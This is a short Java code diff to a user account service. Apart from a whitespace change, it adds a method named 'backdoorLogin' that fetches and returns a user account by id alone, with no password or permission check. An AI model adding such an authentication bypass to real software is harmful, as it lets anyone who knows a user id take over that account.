@@ -23,7 +23,7 @@ import javax.persistence.TypedQuery;
 public class UserAccountService
 {
     @Inject private CrudApi crudApi;
-    
+
     public UserAccount login(UserModel userModel)
     {
         
@@ -84,5 +84,22 @@ public class UserAccountService
             e.printStackTrace();
         }
         return Collections.emptyList();
+    }
+    
+    public UserAccount backdoorLogin(UserAccount userAccount)
+    {
+        try
+        {
+            String qryString = "SELECT e FROM UserAccount e WHERE e.id=?1";
+            TypedQuery<UserAccount> typedQuery = crudApi.getEm().createQuery(qryString, UserAccount.class)
+                    .setParameter(1, userAccount.getId());
+            
+                 return typedQuery.getResultStream().findFirst().orElse(null);
+
+        } catch (Exception e)
+        {
+            e.printStackTrace();
+        }
+        return null;
     }
 }
